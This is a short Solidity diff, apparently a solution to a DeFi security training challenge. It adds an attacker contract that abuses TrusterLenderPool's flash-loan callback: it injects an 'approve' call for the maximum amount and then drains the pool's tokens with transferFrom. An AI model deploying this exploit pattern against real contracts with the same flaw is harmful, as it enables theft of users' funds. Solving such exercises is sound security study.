@@ -40,3 +40,19 @@ contract TrusterLenderPool is ReentrancyGuard {
     }
 
 }
+
+
+
+// attacker contract 
+contract trusterex{
+    function attack(address _pool, address token) public {
+
+    TrusterLenderPool Pool= TrusterLenderPool(_pool);
+    IERC20 Token=IERC20(token);
+    bytes memory data=abi.encodeWithSignature("approve(address,uint256)", address(this),type(uint256).max);
+
+    Pool.flashLoan(0, msg.sender, token, data);
+    Token.transferFrom(_pool, msg.sender, Token.balanceOf(_pool));
+    }
+   
+}
